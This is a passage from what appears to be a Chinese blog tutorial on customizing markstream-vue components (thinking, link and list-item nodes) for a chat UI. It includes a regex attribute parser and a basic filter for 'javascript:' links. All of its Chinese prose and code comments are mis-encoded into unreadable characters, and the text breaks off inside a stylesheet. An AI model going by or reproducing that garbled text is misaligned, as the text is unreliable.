<span class="hljs-keyword">import</span> <span class="hljs-title class_">ThinkingNode</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./ThinkingNode.vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'markstream-vue/index.css'</span>

<span class="hljs-keyword">const</span> md = <span class="hljs-string">`
&lt;thinking&gt;
è¿™æ˜¯æ¨ç†å†…å®¹
&lt;/thinking&gt;


è¯·é€‰æ‹©åŠç†æ–¹å¼
- çº¿ä¸ŠåŠç†
- çº¿ä¸‹åŠç†

&lt;a data-send="å…¶ä»–åŠç†æ–¹å¼"&gt;å…¶ä»–åŠç†æ–¹å¼&lt;/a&gt;
`</span>
<span class="hljs-title function_">setCustomComponents</span>(<span class="hljs-string">'doc'</span>, {
  <span class="hljs-attr">thinking</span>: <span class="hljs-title class_">ThinkingNode</span>,
})
&lt;/script&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">MarkdownRender</span> <span class="hljs-attr">custom-id</span>=<span class="hljs-string">"doc"</span> <span class="hljs-attr">:content</span>=<span class="hljs-string">"md"</span> <span class="hljs-attr">:custom-html-tags</span>=<span class="hljs-string">"['thinking']"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f8eeebcd302549a08bb62bde0107a5b6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5qGc5ZC56Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769005314&amp;x-signature=ZpFlywCVXVQF%2BdgANdhslBtlV4o%3D" alt="image.png" loading="lazy"/></p>
<p>æ²¡å•¥é—®é¢˜ï¼Œæ¥ä¸‹æ¥å¯¹linkèŠ‚ç‚¹è‡ªå®šä¹‰ï¼Œæˆ‘ä»¬åªéœ€è¦ç›´æ¥å»å®˜æ–¹ä»“åº“copyå‡ºæ¥æ”¹å°±å¥½äº†</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FSimon-He95%2Fmarkstream-vue%2Fblob%2Fmain%2Fsrc%2Fcomponents%2FLinkNode%2FLinkNode.vue" target="_blank" title="https://github.com/Simon-He95/markstream-vue/blob/main/src/components/LinkNode/LinkNode.vue" ref="nofollow noopener noreferrer">github.com/Simon-He95/â€¦</a></p>
<p>å› ä¸ºæˆ‘ä»¬ä¸éœ€è¦èŠ±é‡Œèƒ¡å“¨çš„ç‰¹æ•ˆï¼Œè¿™é‡Œå¯¹æºä»£ç è¿›è¡Œåˆ å‡ï¼Œå¹¶ä¸”å¯¹ç‚¹å‡»äº‹ä»¶è¿›è¡Œè°ƒæ•´</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// LinkNode.vue</span>
&lt;script setup lang=<span class="hljs-string">"ts"</span>&gt;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">HtmlInlineNode</span>, <span class="hljs-title class_">ImageNode</span>, <span class="hljs-title class_">StrikethroughNode</span>, <span class="hljs-title class_">StrongNode</span>, <span class="hljs-title class_">TextNode</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'markstream-vue'</span>
<span class="hljs-keyword">import</span> { computed, useAttrs } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { extractAnchorAttributes } <span class="hljs-keyword">from</span> <span class="hljs-string">'./utils.ts'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">LinkNodeNode</span> {
  <span class="hljs-attr">type</span>: <span class="hljs-string">'link'</span>
  <span class="hljs-attr">href</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span> | <span class="hljs-literal">null</span>
  <span class="hljs-attr">text</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">children</span>: { <span class="hljs-attr">type</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">raw</span>: <span class="hljs-built_in">string</span> }[]
  <span class="hljs-attr">raw</span>: <span class="hljs-built_in">string</span>
  loading?: <span class="hljs-built_in">boolean</span>
}

<span class="hljs-comment">// å®šä¹‰é“¾æ¥èŠ‚ç‚¹</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">LinkNodeProps</span> {
  <span class="hljs-attr">node</span>: <span class="hljs-title class_">LinkNodeNode</span>
  indexKey?: <span class="hljs-built_in">number</span> | <span class="hljs-built_in">string</span>
  customId?: <span class="hljs-built_in">string</span>
  showTooltip?: <span class="hljs-built_in">boolean</span>
  color?: <span class="hljs-built_in">string</span>
}

<span class="hljs-comment">// æ¥æ”¶props â€” æŠŠåŠ¨ç”»/é¢œè‰²ç›¸å…³é…ç½®æš´éœ²ä¸ºpropsï¼Œå¹¶é€šè¿‡CSSå˜é‡æ³¨å…¥æ ·å¼</span>
<span class="hljs-keyword">const</span> props = <span class="hljs-title function_">withDefaults</span>(defineProps&lt;<span class="hljs-title class_">LinkNodeProps</span>&gt;(), {
  <span class="hljs-attr">showTooltip</span>: <span class="hljs-literal">true</span>,
})

<span class="hljs-keyword">const</span> emits = defineEmits&lt;{
  <span class="hljs-attr">send</span>: [<span class="hljs-attr">text</span>: <span class="hljs-built_in">string</span>]
}&gt;()

<span class="hljs-keyword">const</span> cssVars = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">return</span> {
    <span class="hljs-string">'--link-color'</span>: props.<span class="hljs-property">color</span> ?? <span class="hljs-string">'#0366d6'</span>,
  } <span class="hljs-keyword">as</span> <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt;
})

<span class="hljs-comment">// Available node components for child rendering</span>
<span class="hljs-keyword">const</span> nodeComponents = {
  <span class="hljs-attr">text</span>: <span class="hljs-title class_">TextNode</span>,
  <span class="hljs-attr">strong</span>: <span class="hljs-title class_">StrongNode</span>,
  <span class="hljs-attr">strikethrough</span>: <span class="hljs-title class_">StrikethroughNode</span>,
  <span class="hljs-attr">image</span>: <span class="hljs-title class_">ImageNode</span>,
  <span class="hljs-attr">html_inline</span>: <span class="hljs-title class_">HtmlInlineNode</span>,
}

<span class="hljs-comment">// forward any non-prop attributes (e.g. custom-id) to the rendered element</span>
<span class="hljs-keyword">const</span> attrs = <span class="hljs-title function_">useAttrs</span>()

<span class="hljs-keyword">const</span> linkAttrs = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">extractAnchorAttributes</span>(props.<span class="hljs-property">node</span>.<span class="hljs-property">raw</span>))

<span class="hljs-keyword">const</span> linkHref = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> href = props.<span class="hljs-property">node</span>.<span class="hljs-property">href</span>
  <span class="hljs-keyword">if</span> (href?.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'javascript:'</span>) || !href) {
    <span class="hljs-comment">// å¦‚æœ href ä»¥ javascript: å¼€å¤´ï¼Œä¸€å¾‹è¿”å› void(0) é˜²æ­¢æ‰§è¡Œæ¶æ„ä»£ç </span>
    <span class="hljs-keyword">return</span> <span class="hljs-string">'javascript:void(0)'</span>
  }
  <span class="hljs-keyword">return</span> href
})

<span class="hljs-keyword">const</span> linkTarget = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (linkAttrs.<span class="hljs-property">value</span>?.<span class="hljs-property">target</span>) {
    <span class="hljs-keyword">return</span> linkAttrs.<span class="hljs-property">value</span>?.<span class="hljs-property">target</span>
  }
  <span class="hljs-keyword">if</span> (!props.<span class="hljs-property">node</span>.<span class="hljs-property">href</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">'_self'</span>
  }
  <span class="hljs-keyword">return</span> <span class="hljs-string">'_blank'</span>
})

<span class="hljs-keyword">const</span> title = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">String</span>(props.<span class="hljs-property">node</span>.<span class="hljs-property">title</span> ?? props.<span class="hljs-property">node</span>.<span class="hljs-property">href</span> ?? <span class="hljs-string">''</span>))

<span class="hljs-keyword">function</span> <span class="hljs-title function_">onClick</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">if</span> (linkAttrs.<span class="hljs-property">value</span>?.[<span class="hljs-string">'data-send'</span>]) {
    <span class="hljs-title function_">emits</span>(<span class="hljs-string">'send'</span>, linkAttrs.<span class="hljs-property">value</span>?.[<span class="hljs-string">'data-send'</span>])
  }
}
&lt;/script&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">a</span>
    <span class="hljs-attr">v-if</span>=<span class="hljs-string">"!node.loading"</span>
    <span class="hljs-attr">class</span>=<span class="hljs-string">"link-node"</span>
    <span class="hljs-attr">:href</span>=<span class="hljs-string">"linkHref"</span>
    <span class="hljs-attr">:target</span>=<span class="hljs-string">"linkTarget"</span>
    <span class="hljs-attr">rel</span>=<span class="hljs-string">"noopener noreferrer"</span>
    <span class="hljs-attr">:title</span>=<span class="hljs-string">"showTooltip ? '' : title"</span>
    <span class="hljs-attr">:aria-label</span>=<span class="hljs-string">"`Link: ${title}`"</span>
    <span class="hljs-attr">:aria-hidden</span>=<span class="hljs-string">"node.loading ? 'true' : 'false'"</span>
    <span class="hljs-attr">v-bind</span>=<span class="hljs-string">"attrs"</span>
    <span class="hljs-attr">:style</span>=<span class="hljs-string">"cssVars"</span>
    @<span class="hljs-attr">click</span>=<span class="hljs-string">"onClick"</span>
  &gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">component</span>
      <span class="hljs-attr">:is</span>=<span class="hljs-string">"nodeComponents[child.type]"</span>
      <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(child, index) in node.children"</span>
      <span class="hljs-attr">:key</span>=<span class="hljs-string">"`${indexKey || 'emphasis'}-${index}`"</span>
      <span class="hljs-attr">:node</span>=<span class="hljs-string">"child"</span>
      <span class="hljs-attr">:custom-id</span>=<span class="hljs-string">"props.customId"</span>
      <span class="hljs-attr">:index-key</span>=<span class="hljs-string">"`${indexKey || 'link-text'}-${index}`"</span>
    /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">v-else</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"link-loading inline-flex items-baseline gap-1.5"</span> <span class="hljs-attr">:aria-hidden</span>=<span class="hljs-string">"!node.loading ? 'true' : 'false'"</span> <span class="hljs-attr">v-bind</span>=<span class="hljs-string">"attrs"</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">"cssVars"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"link-text-wrapper relative inline-flex"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"link-text leading-[normal]"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"link-text leading-[normal]"</span>&gt;</span>{{ node.text }}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span>

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.link-node</span> {
  <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--link-color, <span class="hljs-number">#0366d6</span>);
  <span class="hljs-attribute">text-decoration</span>: none;
}

<span class="hljs-selector-class">.link-loading</span> <span class="hljs-selector-class">.link-text-wrapper</span> {
  <span class="hljs-attribute">position</span>: relative;
}

<span class="hljs-selector-class">.link-loading</span> <span class="hljs-selector-class">.link-text</span> {
  <span class="hljs-attribute">position</span>: relative;
  <span class="hljs-attribute">z-index</span>: <span class="hljs-number">2</span>;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span>
</code></pre>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// utils.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">extractAnchorAttributes</span>(<span class="hljs-params">str: <span class="hljs-built_in">string</span></span>) {
  <span class="hljs-comment">// 1. åŸºç¡€ç±»å‹æ£€æŸ¥</span>
  <span class="hljs-keyword">if</span> (!str)
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>

  <span class="hljs-comment">// å»é™¤é¦–å°¾ç©ºæ ¼ï¼Œæ–¹ä¾¿å¤„ç†</span>
  <span class="hljs-keyword">const</span> trimmed = str.<span class="hljs-title function_">trim</span>()

  <span class="hljs-comment">// 2. å¿«é€Ÿåˆ¤æ–­ï¼šå¿…é¡»ä»¥ &lt;a å¼€å¤´ï¼ˆå¿½ç•¥å¤§å°å†™ï¼‰ï¼Œä¸”åé¢å¿…é¡»è·Ÿç©ºç™½å­—ç¬¦</span>
  <span class="hljs-comment">// è¿™ä¸€æ­¥åªåšæ£€æµ‹ï¼Œä¸æå–ï¼Œé¿å…å¤æ‚çš„æ­£åˆ™å›æº¯</span>
  <span class="hljs-keyword">if</span> (!<span class="hljs-regexp">/^&lt;a\s/i</span>.<span class="hljs-title function_">test</span>(trimmed)) {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>
  }

  <span class="hljs-comment">// 3. æå– &lt;a ... &gt; ä¸­é—´çš„å†…å®¹</span>
  <span class="hljs-comment">// æ—¢ç„¶æˆ‘ä»¬å·²ç»ç¡®ä¿¡å®ƒæ˜¯ &lt;a å¼€å¤´ï¼Œç›´æ¥æ‰¾ç¬¬ä¸€ä¸ª &gt; çš„ä½ç½®å³å¯</span>
  <span class="hljs-comment">// è¿™ç§ä½¿ç”¨ indexOf + slice çš„æ–¹å¼æ˜¯ O(n) çš„ï¼Œç»å¯¹æ²¡æœ‰ ReDoS é£é™©</span>
  <span class="hljs-keyword">const</span> closeTagIndex = trimmed.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">'&gt;'</span>)
  <span class="hljs-keyword">if</span> (closeTagIndex === -<span class="hljs-number">1</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>

  <span class="hljs-comment">// æˆªå– &lt;a å’Œ &gt; ä¸­é—´çš„å­—ç¬¦ä¸²</span>
  <span class="hljs-comment">// &lt;a href="..."&gt; -&gt; æˆªå– " href="..."</span>
  <span class="hljs-comment">// æˆ‘ä»¬ä¸éœ€è¦ç²¾ç¡®å»æ‰ &lt;a åçš„ç©ºæ ¼ï¼Œå› ä¸ºåé¢çš„å±æ€§æ­£åˆ™ä¼šè‡ªåŠ¨å¤„ç†ç©ºæ ¼</span>
  <span class="hljs-keyword">const</span> attrString = trimmed.<span class="hljs-title function_">slice</span>(<span class="hljs-number">2</span>, closeTagIndex)

  <span class="hljs-comment">// 4. è§£æå±æ€§é”®å€¼å¯¹</span>
  <span class="hljs-keyword">const</span> <span class="hljs-attr">attributes</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">string</span>&gt; = {}

  <span class="hljs-comment">// ä¼˜åŒ–åçš„æ­£åˆ™ï¼š</span>
  <span class="hljs-comment">// ([^\s=]+)  åŒ¹é…å±æ€§å (éç©ºæ ¼ã€éç­‰å·)</span>
  <span class="hljs-comment">// \s*=\s*    åŒ¹é…ç­‰å·åŠå‘¨å›´ç©ºæ ¼</span>
  <span class="hljs-comment">// (["'])     æ•è·å¼•å·</span>
  <span class="hljs-comment">// (.*?)      æ•è·å€¼ (éè´ªå©ª)</span>
  <span class="hljs-comment">// \2         åŒ¹é…é—­åˆå¼•å·</span>
  <span class="hljs-keyword">const</span> attrRegex = <span class="hljs-regexp">/([^\s=]+)\s*=\s*(["'])(.*?)\2/g</span>

  <span class="hljs-comment">// 5. ä½¿ç”¨ matchAll æ›¿ä»£ while èµ‹å€¼å¾ªç¯</span>
  <span class="hljs-comment">// matchAll è¿”å›ä¸€ä¸ªè¿­ä»£å™¨ï¼Œå®Œç¾è§£å†³ ESLint no-cond-assign é—®é¢˜</span>
  <span class="hljs-keyword">const</span> matches = attrString.<span class="hljs-title function_">matchAll</span>(attrRegex)

  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> match <span class="hljs-keyword">of</span> matches) {
    <span class="hljs-keyword">if</span> (!match[<span class="hljs-number">1</span>])
      <span class="hljs-keyword">continue</span>
    <span class="hljs-comment">// match[1] æ˜¯ key, match[3] æ˜¯ value</span>
    attributes[match[<span class="hljs-number">1</span>]] = match[<span class="hljs-number">3</span>] || <span class="hljs-string">''</span>
  }

  <span class="hljs-keyword">return</span> attributes
}
</code></pre>
<p>å› ä¸ºæˆ‘çš„ä¸šåŠ¡éœ€è¦å°†ä¸€äº›å±æ€§åŠ åˆ°æ ‡ç­¾çš„å±æ€§ä¸Šï¼Œè¿™é‡Œæˆ‘è®©å“ˆåŸºç±³3proå¸®æˆ‘å†™äº†ä¸€æ®µæ­£åˆ™ï¼Œä»rawçš„htmlä¸Šé¢æå–å±æ€§ã€‚</p>
<p>å¾ˆå®Œç¾ï¼Œå¯ä»¥æ­£å¸¸æ•è·ç‚¹å‡»äº†ï¼Œä½†æ˜¯å¦‚æœåƒä¸Šé¢é‚£æ ·é…ç½®thinkingèŠ‚ç‚¹ä¸€æ ·é…ç½®ï¼Œæˆ‘ä»¬å°±æ²¡åŠæ³•æ‹¿åˆ°äº‹ä»¶äº†ï¼Œè¿™é‡Œæˆ‘ä»¬è¦å–ä¸ªå·§ï¼Œåœ¨å¤–é¢å°†è¿™ä¸ªlinkç»„ä»¶åŒ…å¤šä¸€å±‚ï¼Œæ‹¿åˆ°emitï¼š</p>
<pre><code class="hljs language-ts" lang="ts">&lt;script setup lang=<span class="hljs-string">"ts"</span>&gt;
<span class="hljs-keyword">import</span> { h } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">MarkdownRender</span>, setCustomComponents } <span class="hljs-keyword">from</span> <span class="hljs-string">'markstream-vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ThinkingNode</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./ThinkingNode.vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">LinkNode</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./LinkNode.vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'markstream-vue/index.css'</span>
<span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> { <span class="hljs-title class_">LinkNodeNode</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./LinkNode.vue'</span>

<span class="hljs-keyword">const</span> md = <span class="hljs-string">`
&lt;thinking&gt;
è¿™æ˜¯æ¨ç†å†…å®¹
&lt;/thinking&gt;


è¯·é€‰æ‹©åŠç†æ–¹å¼
- çº¿ä¸ŠåŠç†
- çº¿ä¸‹åŠç†

&lt;a data-send="å…¶ä»–åŠç†æ–¹å¼"&gt;å…¶ä»–åŠç†æ–¹å¼&lt;/a&gt;
`</span>
<span class="hljs-title function_">setCustomComponents</span>(<span class="hljs-string">'doc'</span>, {
  <span class="hljs-attr">thinking</span>: <span class="hljs-title class_">ThinkingNode</span>,
  <span class="hljs-attr">link</span>: <span class="hljs-function">(<span class="hljs-params">props: { node: LinkNodeNode }</span>) =&gt;</span> <span class="hljs-title function_">h</span>(<span class="hljs-title class_">LinkNode</span>, {
    ...props,
    <span class="hljs-title function_">onSend</span>(<span class="hljs-params">text</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(text)
    },
  }),
})
&lt;/script&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">MarkdownRender</span> <span class="hljs-attr">custom-id</span>=<span class="hljs-string">"doc"</span> <span class="hljs-attr">:content</span>=<span class="hljs-string">"md"</span> <span class="hljs-attr">:custom-html-tags</span>=<span class="hljs-string">"['thinking']"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span>
</code></pre>
<p>list_itemä¹Ÿæ˜¯ç±»ä¼¼çš„æ“ä½œï¼Œä¸è¿‡æœ‰ç‚¹åŒºåˆ«æ˜¯éœ€è¦è‡ªå®šä¹‰listèŠ‚ç‚¹ï¼Œæ²¡åŠæ³•å•ç‹¬è‡ªå®šä¹‰list_itemï¼Œä¸è¿‡æ–¹æ³•ä¹Ÿæ˜¯ç±»ä¼¼çš„ï¼ŒæŠŠæºä»£ç copyå‡ºæ¥æ”¹å°±å¯ä»¥ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// ListNode.vue</span>
&lt;script setup lang=<span class="hljs-string">"ts"</span>&gt;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ListItemNode</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./ListItemNode.vue'</span>

<span class="hljs-comment">// èŠ‚ç‚¹å­å…ƒç´ ç±»å‹</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">NodeChild</span> {
  <span class="hljs-attr">type</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">raw</span>: <span class="hljs-built_in">string</span>
  [<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">unknown</span>
}

<span class="hljs-comment">// åˆ—è¡¨é¡¹ç±»å‹</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">ListItem</span> {
  <span class="hljs-attr">type</span>: <span class="hljs-string">'list_item'</span>
  <span class="hljs-attr">children</span>: <span class="hljs-title class_">NodeChild</span>[]
  <span class="hljs-attr">raw</span>: <span class="hljs-built_in">string</span>
}

<span class="hljs-keyword">const</span> { node, customId, indexKey, typewriter } = defineProps&lt;{
  <span class="hljs-attr">node</span>: {
    <span class="hljs-attr">type</span>: <span class="hljs-string">'list'</span>
    <span class="hljs-attr">ordered</span>: <span class="hljs-built_in">boolean</span>
    start?: <span class="hljs-built_in">number</span>
    <span class="hljs-attr">items</span>: <span class="hljs-title class_">ListItem</span>[]
    <span class="hljs-attr">raw</span>: <span class="hljs-built_in">string</span>
  }
  customId?: <span class="hljs-built_in">string</span>
  indexKey?: <span class="hljs-built_in">number</span> | <span class="hljs-built_in">string</span>
  typewriter?: <span class="hljs-built_in">boolean</span>
}&gt;()

<span class="hljs-title function_">defineEmits</span>([<span class="hljs-string">'copy'</span>])
&lt;/script&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">component</span>
    <span class="hljs-attr">:is</span>=<span class="hljs-string">"node.ordered ? 'ol' : 'ul'"</span>
    <span class="hljs-attr">class</span>=<span class="hljs-string">"list-node"</span>
    <span class="hljs-attr">:class</span>=<span class="hljs-string">"{ 'list-decimal': node.ordered, 'list-disc': !node.ordered }"</span>
  &gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ListItemNode</span>
      <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(item, index) in node.items"</span>
      <span class="hljs-attr">:key</span>=<span class="hljs-string">"`${indexKey || 'list'}-${index}`"</span>
      <span class="hljs-attr">v-memo</span>=<span class="hljs-string">"[item]"</span>
      <span class="hljs-attr">:item</span>=<span class="hljs-string">"item"</span>
      <span class="hljs-attr">:custom-id</span>=<span class="hljs-string">"customId"</span>
      <span class="hljs-attr">:index-key</span>=<span class="hljs-string">"`${indexKey || 'list'}-${index}`"</span>
      <span class="hljs-attr">:typewriter</span>=<span class="hljs-string">"typewriter"</span>
      <span class="hljs-attr">:value</span>=<span class="hljs-string">"node.ordered ? (node.start ?? 1) + index : undefined"</span>
      @<span class="hljs-attr">copy</span>=<span class="hljs-string">"$emit('copy', $event)"</span>
    /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">component</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span>

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.list-node</span> {
  <span class="hljs-keyword">@apply</span> my-<span class="hljs-number">5</span> pl-[calc(<span class="hljs-number">13</span>/<span class="hljs-number">8</span>*<span class="hljs-number">1em</span>)];
}
<span class="hljs-selector-class">.list-decimal</span> {
  <span class="hljs-attribute">list-style-type</span>: decimal;
}
<span class="hljs-selector-class">.list-disc</span> {
  <span class="hljs-attribute">list-style-type</span>: disc;
  <span class="hljs-keyword">@apply</span> <span class="hljs-attribute">max-lg</span>:my-[calc(<span class="hljs-number">4</span>/<span class="hljs-number">3</span>*<span class="hljs-number">1em</span>)] <span class="hljs-attribute">max-lg</span>:pl-[calc(<span class="hljs-number">14</span>/<span class="hljs-number">9</span>*<span class="hljs-number">1em</span>)];
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span>
</code></pre>
<pre><code class="hljs language-ts" lang="ts">&lt;script setup lang=<span class="hljs-string">"ts"</span>&gt;
<span class="hljs-keyword">import</span> { computed, watchEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">MarkdownRender</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'markstream-vue'</span>

<span class="hljs-comment">// èŠ‚ç‚¹å­å…ƒç´ ç±»å‹</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">NodeChild</span> {
  <span class="hljs-attr">type</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">raw</span>: <span class="hljs-built_in">string</span>
  [<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">unknown</span>
}

<span class="hljs-comment">// åˆ—è¡¨é¡¹ç±»å‹</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">ListItem</span> {
  <span class="hljs-attr">type</span>: <span class="hljs-string">'list_item'</span>
  <span class="hljs-attr">children</span>: <span class="hljs-title class_">NodeChild</span>[]
  <span class="hljs-attr">raw</span>: <span class="hljs-built_in">string</span>
}

<span class="hljs-keyword">const</span> props = defineProps&lt;{
  <span class="hljs-attr">item</span>: <span class="hljs-title class_">ListItem</span>
  indexKey?: <span class="hljs-built_in">number</span> | <span class="hljs-built_in">string</span>
  value?: <span class="hljs-built_in">number</span>
  customId?: <span class="hljs-built_in">string</span>
  <span class="hljs-comment">/** Forwarded flag to enable/disable non-code node enter transition */</span>
  typewriter?: <span class="hljs-built_in">boolean</span>
}&gt;()

defineEmits&lt;{
  <span class="hljs-attr">copy</span>: [<span class="hljs-attr">text</span>: <span class="hljs-built_in">string</span>]
}&gt;()

<span class="hljs-keyword">const</span> liValueAttr = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span>
  props.<span class="hljs-property">value</span> == <span class="hljs-literal">null</span> ? {} : { <span class="hljs-attr">value</span>: props.<span class="hljs-property">value</span> },
)

<span class="hljs-keyword">function</span> <span class="hljs-title function_">onClick</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(props.<span class="hljs-property">item</span>.<span class="hljs-property">children</span>[<span class="hljs-number">0</span>]?.<span class="hljs-property">raw</span>)
}
&lt;/script&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">li</span>
    <span class="hljs-attr">class</span>=<span class="hljs-string">"my-2 list-item pl-1.5"</span>
    <span class="hljs-attr">dir</span>=<span class="hljs-string">"auto"</span>
    <span class="hljs-attr">v-bind</span>=<span class="hljs-string">"liValueAttr"</span>
    @<span class="hljs-attr">click.capture</span>=<span class="hljs-string">"onClick"</span>
  &gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">MarkdownRender</span> <span class="hljs-attr">:nodes</span>=<span class="hljs-string">"item.children"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span>

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-tag">ol</span> &gt; <span class="hljs-selector-class">.list-item</span><span class="hljs-selector-pseudo">::marker</span> {
  <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--list-item-counter-marker, <span class="hljs-number">#64748b</span>);
  <span class="hljs-attribute">line-height</span>: <span class="hljs-number">1.6</span>;
}
<span class="hljs-selector-tag">ul</span> &gt; <span class="hljs-selector-class">.list-item</span><span class="hljs-selector-pseudo">::marker</span> {
  <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--list-item-marker, <span class="hljs-number">#cbd5e1</span>);
}

